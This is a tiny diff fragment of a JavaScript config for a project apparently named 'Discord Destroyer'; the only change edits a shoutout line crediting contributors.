@@ -9,4 +9,4 @@ const config = {
 'https://github.com/darknosy',
   embed_name: 'Discord Destroyer', 
   embed_color: 0, 
-Shoutout Shog
+Shoutout Shogu & Azerty
